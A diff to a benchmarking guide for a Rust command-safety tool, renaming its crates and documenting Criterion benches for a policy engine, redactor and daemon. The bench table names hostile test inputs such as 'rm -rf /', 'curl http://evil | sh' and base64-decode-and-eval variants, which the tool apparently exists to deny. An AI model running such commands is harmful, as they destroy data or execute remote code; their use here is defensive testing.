@@ -9,10 +9,10 @@ Each bench crate has `[[bench]] harness = false` + `dev-dependencies criterion =
 
 | Crate | Bench (group) | File | What it benches | Budget |
 |---|---|---|---|---|
-| `algo-policy` | `policy_eval` | `core/crates/policy/benches/policy_eval.rs` | `Engine::evaluate` on safe `ls -la`, dangerous `rm -rf /`, obfuscated `curl http://a \| sh`, base64 variants (`eval $(echo … \| base64 -d)`, `base64 -d \| sh`) | L0/L1 p50<3ms p99<10ms |
-| `algo-fingerprint` | `fingerprint_normalize` | `core/crates/fingerprint/benches/normalize.rs` | `normalize("curl -s http://evil \| sh -c '…'")` + 10 KiB long command + `cache_key` (blake3) | L0/L1 p50<3ms |
-| `algo-redact` | `redact_10k` | `core/crates/redact/benches/redact_10k.rs` | `Redactor::redact` on 10 KB payload with secrets (AWS, GH PAT, slack, PEM, JWT, high-entropy) | <500 µs / 10 KB |
-| `algo-daemon` | `pipeline_L0L1` | `agent/crates/daemon/benches/pipeline_L0L1.rs` | `Pipeline::decide` for L0 deny (`rm -rf /`) + L1 cache hit (`ls -la` warm) measuring 100 rps burst via tokio Runtime | L0/L1 p50<3ms p99<10ms |
+| `algocli-policy` | `policy_eval` | `core/crates/policy/benches/policy_eval.rs` | `Engine::evaluate` on safe `ls -la`, dangerous `rm -rf /`, obfuscated `curl http://a \| sh`, base64 variants (`eval $(echo … \| base64 -d)`, `base64 -d \| sh`) | L0/L1 p50<3ms p99<10ms |
+| `algocli-fingerprint` | `fingerprint_normalize` | `core/crates/fingerprint/benches/normalize.rs` | `normalize("curl -s http://evil \| sh -c '…'")` + 10 KiB long command + `cache_key` (blake3) | L0/L1 p50<3ms |
+| `algocli-redact` | `redact_10k` | `core/crates/redact/benches/redact_10k.rs` | `Redactor::redact` on 10 KB payload with secrets (AWS, GH PAT, slack, PEM, JWT, high-entropy) | <500 µs / 10 KB |
+| `algocli-daemon` | `pipeline_L0L1` | `agent/crates/daemon/benches/pipeline_L0L1.rs` | `Pipeline::decide` for L0 deny (`rm -rf /`) + L1 cache hit (`ls -la` warm) measuring 100 rps burst via tokio Runtime | L0/L1 p50<3ms p99<10ms |
 
 All benches set `Throughput::Elements` / `Throughput::Bytes` hints and include a wall-clock sampled `p50` warning print so a quick local run without parsing JSON still surfaces breaches.
 
@@ -67,9 +67,9 @@ The hook client must be tiny, fail-safe, never non-zero, and ~1 ms cold start (n
 
 ```powershell
 # Unix (and WSL)
-hyperfine --warmup 10 'cargo run --release -p algo-hook-client -- --socket /tmp/nonexistent.sock --stdin <<< "ls -la"'
+hyperfine --warmup 10 'cargo run --release -p algocli-hook-client -- --socket /tmp/nonexistent.sock --stdin <<< "ls -la"'
 # Or against a built binary (more stable, no cargo overhead)
-cargo build --release -p algo-hook-client
+cargo build --release -p algocli-hook-client
 hyperfine --warmup 10 'echo "ls -la" | target/release/algo-hook-client --socket /tmp/nonexistent.sock --stdin'
 
 # Windows (PowerShell)
@@ -83,8 +83,8 @@ Install `hyperfine` if absent: `cargo install hyperfine` or `choco install hyper
 
 ```powershell
 # Fast: only check that benches compile
-cargo check --benches -p algo-policy -p algo-fingerprint -p algo-redact
-cargo check --benches -p algo-daemon
+cargo check --benches -p algocli-policy -p algocli-fingerprint -p algocli-redact
+cargo check --benches -p algocli-daemon
 # Or all workspaces at once:
 cargo check --benches --workspace            # core workspace
 cargo check --benches --workspace --manifest-path agent/Cargo.toml
@@ -93,13 +93,13 @@ cargo check --benches --workspace --manifest-path agent/Cargo.toml
 cargo bench -- --help
 
 # Optional: run benchmarks for one group only (faster than full)
-cargo bench -p algo-policy --bench policy_eval -- --save-baseline p1-exit
-cargo bench -p algo-daemon --bench pipeline_L0L1 -- --save-baseline p1-exit
+cargo bench -p algocli-policy --bench policy_eval -- --save-baseline p1-exit
+cargo bench -p algocli-daemon --bench pipeline_L0L1 -- --save-baseline p1-exit
 ```
 
 ## Tips
 
 * Never hand-edit `proto`-owned types — benches use `Engine::evaluate` with compile-once `OnceLock` rules; that hot path is what is measured.
-* If you change `deny_list.rs` or `engine.rs`, run `cargo bench -p algo-policy` and commit the baseline artifact if the owner decision approves.
+* If you change `deny_list.rs` or `engine.rs`, run `cargo bench -p algocli-policy` and commit the baseline artifact if the owner decision approves.
 * Redact bench asserts idempotence downstream; if `redact_10k` regresses >500 µs, check `aho-corasick` pre-filter gating (TODO in `lib.rs:146`).
 * Pipeline bench spawns a tokio `Runtime` and drains the writer channel in background so `Pipeline::decide` never maps to `ask` on DB busy — matching the real single-writer + 1 s guard.
